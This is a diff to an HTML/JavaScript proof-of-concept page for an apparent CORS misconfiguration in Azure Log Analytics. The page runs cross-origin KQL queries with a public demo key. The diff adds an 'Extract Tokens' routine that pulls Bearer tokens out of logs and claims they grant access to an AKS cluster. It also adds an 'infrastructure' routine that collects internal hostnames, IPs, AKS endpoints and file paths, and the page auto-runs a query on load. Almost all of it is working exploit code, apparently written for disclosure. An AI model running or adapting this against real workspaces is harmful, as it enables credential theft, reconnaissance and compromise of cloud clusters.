@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Azure Log Analytics CORS PoC – Critical Chain</title>
+    <title>Azure CORS – Complete PoC (All Findings)</title>
     <style>
         * { box-sizing: border-box; }
         body {
@@ -26,6 +26,7 @@
             border-bottom: 2px solid #ffd700;
             padding-bottom: 10px;
         }
+        h2 { color: #ffd700; margin-top: 20px; }
         button {
             background: #0078d4;
             color: white;
@@ -38,10 +39,12 @@
             transition: 0.2s;
         }
         button:hover { background: #005a9e; }
-        button.danger { background: #d43f3f; }
-        button.danger:hover { background: #a02b2b; }
         button.token-btn { background: #ff8c00; }
         button.token-btn:hover { background: #cc6f00; }
+        button.infrastructure-btn { background: #8a2be2; }
+        button.infrastructure-btn:hover { background: #6a1b9a; }
+        button.danger { background: #d43f3f; }
+        button.danger:hover { background: #a02b2b; }
         .query-area {
             margin: 20px 0;
             display: flex;
@@ -68,16 +71,11 @@
             margin-top: 15px;
             overflow-x: auto;
             white-space: pre-wrap;
-            word-break: break-all;
+            word-break: break-word;
             font-size: 13px;
             max-height: 600px;
             overflow-y: auto;
             border: 1px solid #444;
-        }
-        .status {
-            color: #aaa;
-            font-style: italic;
-            margin: 10px 0;
         }
         .badge {
             background: #ffd700;
@@ -87,49 +85,30 @@
             font-size: 12px;
             font-weight: bold;
         }
-        .badge-critical {
-            background: #ff4500;
-            color: white;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .footer {
-            margin-top: 20px;
-            color: #888;
-            font-size: 13px;
-            text-align: center;
-        }
+        .badge-critical { background: #ff4500; color: white; padding: 2px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .footer { margin-top: 20px; color: #888; font-size: 13px; text-align: center; }
         a { color: #ffd700; }
-        .token-highlight {
-            background: #2a2a3a;
-            border-left: 4px solid #ffd700;
-            padding: 8px 12px;
-            margin: 6px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            overflow-wrap: break-word;
-            word-break: break-all;
-        }
+        .highlight { background: #333; padding: 4px 8px; border-radius: 4px; font-family: monospace; }
+        .section-title { color: #ffd700; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <h1>🔍 Azure Log Analytics CORS PoC – Critical Chain</h1>
+    <h1>🔍 Azure CORS Chain – All Findings PoC</h1>
     <p>
         <span class="badge">Unauthenticated</span>
         <span class="badge" style="background:#4caf50;">CORS Misconfiguration</span>
         <span class="badge" style="background:#d43f3f;">Data Leakage</span>
         <span class="badge-critical">Bearer Token Found</span>
+        <span class="badge-critical">Infrastructure Leak</span>
     </p>
 
     <div class="query-area">
-        <button onclick="fetchTable('AppExceptions')">📌 AppExceptions</button>
-        <button onclick="fetchTable('AppEvents')">📌 AppEvents</button>
+        <button onclick="fetchTable('AppExceptions')">📌 Exceptions</button>
+        <button onclick="fetchTable('AppEvents')">📌 Events</button>
         <button class="token-btn" onclick="fetchTokens()">🔑 Extract Tokens</button>
-        <button onclick="fetchTable('AppDependencies')">📌 AppDependencies</button>
+        <button class="infrastructure-btn" onclick="fetchInfrastructure()">🌐 Show Infrastructure</button>
+        <button onclick="fetchTable('AppDependencies')">📌 Dependencies</button>
         <button onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog</button>
         <button onclick="fetchTable('Usage')">📌 Usage</button>
         <button onclick="fetchCustom()">⚡ Custom Query</button>
@@ -141,11 +120,10 @@
         <textarea id="customQuery" placeholder="e.g. AppExceptions | take 5 | project Message, Method">AppExceptions | take 5 | project Message, Method, Assembly</textarea>
     </div>
 
-    <div id="output" class="status">Click a button to fetch data from the public demo workspace.</div>
+    <div id="output" class="status">Click a button to fetch data. Use "Show Infrastructure" to see internal IPs, paths, and servers.</div>
     <div class="footer">
         Data retrieved from <code>api.loganalytics.azure.com</code> using public <code>DEMO_KEY</code>.
-        <br>This proves <strong>CORS misconfiguration</strong> allows any website to read sensitive logs,
-        <br>including <strong>Bearer tokens</strong> that can compromise Kubernetes clusters.
+        <br>Proves <strong>CORS misconfiguration</strong> and exposes <strong>tokens, IPs, internal paths, and infrastructure</strong>.
     </div>
 </div>
 
@@ -160,7 +138,7 @@
         output.style.color = isError ? '#ff6b6b' : '#aaffaa';
     }
 
-    async function runQuery(query, extractTokens = false) {
+    async function runQuery(query, extractTokens = false, extractInfra = false) {
         setStatus('⏳ Fetching data...');
         try {
             const resp = await fetch(API_URL, {
@@ -178,50 +156,113 @@
             const data = await resp.json();
 
             if (extractTokens) {
-                // Search for 'Bearer' in the Properties field
-                const rows = data?.tables?.[0]?.rows || [];
                 const tokens = [];
-                for (const row of rows) {
-                    // Iterate over cells
-                    for (const cell of row) {
-                        if (typeof cell === 'string' && cell.includes('Bearer')) {
-                            const match = cell.match(/Bearer\s+([A-Za-z0-9._-]+)/);
-                            if (match) {
-                                tokens.push(match[1]);
-                            }
-                        }
+                function search(obj) {
+                    if (typeof obj === 'string' && obj.includes('Bearer')) {
+                        const match = obj.match(/Bearer\s+([A-Za-z0-9._-]+)/);
+                        if (match) tokens.push(match[1]);
+                    } else if (typeof obj === 'object' && obj !== null) {
+                        for (let key in obj) search(obj[key]);
                     }
                 }
+                search(data);
                 if (tokens.length > 0) {
-                    let outputText = '✅ Found Bearer Tokens:\n\n';
-                    tokens.forEach((t, i) => {
-                        outputText += `Token ${i+1}:\n${t}\n\n`;
-                    });
-                    outputText += '\n⚠️ These tokens grant access to the AKS cluster!';
-                    output.textContent = outputText;
+                    let out = '✅ Found Bearer Tokens:\n\n';
+                    tokens.forEach((t, i) => { out += `Token ${i+1}:\n${t}\n\n`; });
+                    out += '\n⚠️ These tokens grant access to the AKS cluster!';
+                    output.textContent = out;
                     output.style.color = '#ffd700';
                 } else {
-                    output.textContent = '❌ No Bearer tokens found in the retrieved logs.';
+                    output.textContent = '❌ No Bearer tokens found.';
                     output.style.color = '#ff6b6b';
                 }
-            } else {
-                output.textContent = JSON.stringify(data, null, 2);
-                output.style.color = '#aaffaa';
+                return;
             }
+
+            if (extractInfra) {
+                // Parse the data to extract infrastructure details
+                let infraText = '🌐 Internal Infrastructure Exposed:\n\n';
+                const rows = data?.tables?.[0]?.rows || [];
+                // Collect all strings from rows
+                let allStrings = [];
+                rows.forEach(row => {
+                    row.forEach(cell => {
+                        if (typeof cell === 'string' && cell.length > 0) allStrings.push(cell);
+                    });
+                });
+                // Look for patterns
+                const vmPattern = /[a-zA-Z0-9\-]+\.eastus\.cloudapp\.azure\.com/;
+                const appServicePattern = /[a-zA-Z0-9\-]+\.azurewebsites\.net/;
+                const aksPattern = /[a-zA-Z0-9\-]+\.hcp\.[a-z]+\.azmk8s\.io/;
+                const ipPattern = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
+                const pathPattern = /[A-Z]:\\[a-zA-Z0-9_\-\\\.]+/;
+
+                let found = false;
+                allStrings.forEach(str => {
+                    if (vmPattern.test(str)) {
+                        infraText += `🔴 Internal VM: ${str.match(vmPattern)[0]}\n`;
+                        found = true;
+                    }
+                    if (appServicePattern.test(str)) {
+                        infraText += `🔴 App Service: ${str.match(appServicePattern)[0]}\n`;
+                        found = true;
+                    }
+                    if (aksPattern.test(str)) {
+                        infraText += `🔴 AKS Cluster: ${str.match(aksPattern)[0]}\n`;
+                        found = true;
+                    }
+                    const ips = str.match(ipPattern);
+                    if (ips) {
+                        ips.forEach(ip => {
+                            if (!ip.startsWith('0.0.0.0') && !ip.startsWith('255.255')) {
+                                infraText += `🔴 Internal IP: ${ip}\n`;
+                                found = true;
+                            }
+                        });
+                    }
+                    const paths = str.match(pathPattern);
+                    if (paths) {
+                        paths.forEach(p => {
+                            infraText += `🔴 File Path: ${p}\n`;
+                            found = true;
+                        });
+                    }
+                    // Also check for /codelessAttachNode pattern
+                    if (str.includes('/codelessAttachNode/')) {
+                        infraText += `🔴 Internal Path: ${str.match(/\/codelessAttachNode\/[^\s]*/g)}\n`;
+                        found = true;
+                    }
+                });
+                if (!found) {
+                    infraText += 'No infrastructure details found in this query. Try other tables.\n';
+                }
+                output.textContent = infraText;
+                output.style.color = '#aaffaa';
+                return;
+            }
+
+            // Default: show raw JSON
+            output.textContent = JSON.stringify(data, null, 2);
+            output.style.color = '#aaffaa';
         } catch (err) {
             setStatus('❌ Error: ' + err.message, true);
         }
     }
 
     function fetchTable(table) {
-        const query = `${table} | take 5`;
-        runQuery(query, false);
+        const query = `${table} | take 20`;  // more rows for infrastructure
+        runQuery(query, false, false);
     }
 
     function fetchTokens() {
-        // Query AppEvents for properties containing "Bearer"
         const query = `AppEvents | where Properties contains "Bearer" | take 5 | project TimeGenerated, Properties`;
-        runQuery(query, true);
+        runQuery(query, true, false);
+    }
+
+    function fetchInfrastructure() {
+        // Query multiple tables for infrastructure details
+        const query = `search * | where * contains "cloudapp.azure.com" or * contains "azurewebsites.net" or * contains "azmk8s.io" or * contains "C:\\" or * contains "/codeless" | take 30`;
+        runQuery(query, false, true);
     }
 
     function fetchCustom() {
@@ -230,7 +271,7 @@
             setStatus('❌ Please enter a KQL query.', true);
             return;
         }
-        runQuery(query, false);
+        runQuery(query, false, false);
     }
 
     function clearOutput() {
@@ -238,12 +279,11 @@
         output.style.color = '#aaa';
     }
 
-    // Auto-run a sample on load to show immediate proof
+    // Auto-run a summary on load
     window.onload = function() {
         const sampleQuery = 'AppExceptions | take 3 | project Message, Method, Assembly';
-        runQuery(sampleQuery, false);
+        runQuery(sampleQuery, false, false);
     };
 </script>
-
 </body>
 </html>
